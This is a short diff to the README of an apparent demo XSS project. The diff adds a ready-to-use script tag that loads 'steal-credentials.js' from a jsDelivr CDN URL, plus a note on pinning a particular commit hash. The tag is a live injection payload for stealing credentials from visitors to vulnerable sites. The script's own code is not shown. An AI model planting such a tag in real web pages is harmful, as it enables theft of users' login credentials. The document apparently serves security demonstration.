@@ -8,4 +8,10 @@ This is a demo XSS script that can be injected into a vulnerable web application
 
 The script can be referenced from a script tag using jsdelivr CDN:
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/barrcodes/xss@[optional commit hash]/steal-credentials.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/barrcodes/xss/steal-credentials.js"></script>
+
+# To access a specific version
+
+As CDNs should, jsdelivr caches the most recent version of the script. Sometimes you will be pulling an old version of the code, in which case you need to edit the above src path to say `xss@hash/steal-credentials.js` replacing "hash" with a commit hash. For example, the most recent version as of writing this readme is:
+
+https://cdn.jsdelivr.net/gh/barrcodes/xss@6f7ad5044e425514c856432a2adf4f6d61998535/steal-credentials.js
